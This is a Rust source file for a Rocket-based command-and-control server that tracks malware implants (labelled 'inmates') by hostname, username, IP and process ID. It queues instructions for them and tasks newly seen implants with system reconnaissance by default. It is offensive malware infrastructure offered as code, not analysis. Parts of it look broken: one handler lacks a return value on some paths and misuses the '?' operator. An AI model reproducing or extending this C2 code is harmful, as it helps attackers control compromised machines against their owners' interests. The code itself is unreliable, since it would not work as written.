extern crate Justice;
#[macro_use] extern crate rocket;
use rocket::serde::{Deserialize, Serialize, json::Json};
use rand::random;
use rocket::Response;
use Justice::{C2Request, C2Response};
use Justice::actions::{ResponseActionType, RequestActionType};
use turbosql::{Turbosql,select,execute};

#[derive(Turbosql, Default)]
struct Inmate {
    rowid: Option<i64>,
    implant_id: Option<String>,
    implant_type: Option<String>,
    implant_version: Option<String>,
    implant_os: Option<String>,
    implant_arch: Option<String>,
    implant_hostname: Option<String>,
    implant_username: Option<String>,
    implant_ip: Option<String>,
    implant_pid: Option<i64>,
    implant_last_checkin: Option<u32>,
    pending_instruct: Option<String>,
    pending_instruct_type: Option<ResponseActionType>,
}

#[get("/")]
fn index() -> &'static str {
    "Hello, world!"
}

#[post("/c2/<implant_id>", data = "<c2_request>")]
fn handle_c2_request(implant_id: String, c2_request: Json<Justice::C2Request>) -> &'static str {
    println!("Implant ID: {}", implant_id);
    println!("Action Type: {:?}", c2_request.message_headers.action_type);
    println!("Timestamp: {}", c2_request.message_headers.timestamp);
    "Hello, world!"
}

#[get("/c2/<implant_id>")] 
fn get_c2_request(implant_id: String) -> Json<C2Response> {
    let inmateRow: Result<Inmate, _> = select!(Inmate "where implant_id =" implant_id);
    match inmateRow {
        Ok(inmate) => {
            match inmate.pending_instruct {
                Some(instruct) => {
                    return Json(C2Response::new(
                        inmate.implant_id.unwrap(),
                        std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .expect("Time went backwards")
                            .as_secs() as u64,
                        inmate.pending_instruct_type.unwrap(),
                        instruct,
                    ));
                },
                None => {
                    println!("No pending instructions for {}", implant_id);
                }
            }
        },
        Err(e) => {
            // Inmate not found, needs to register
            let rowid = Inmate {
                rowid: Some(rand::random::<i64>()),
                implant_id: Some(implant_id.clone()),
                implant_type: None,
                implant_version: None,
                implant_os: None,
                implant_arch: None,
                implant_hostname: None,
                implant_username: None,
                implant_ip: None,
                implant_pid: None,
                implant_last_checkin: Some(std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .expect("Time went backwards")
                    .as_secs() as u32),
                pending_instruct: Some("SystemInfo".to_string()),
                pending_instruct_type: Some(ResponseActionType::CallAction),

            }.insert()?;
        }
    };
}

#[launch]
fn rocket() -> _ {
    rocket::build()
        .mount("/", routes![index])
        .mount("/", routes![handle_c2_request])
        .mount("/", routes![get_c2_request])
}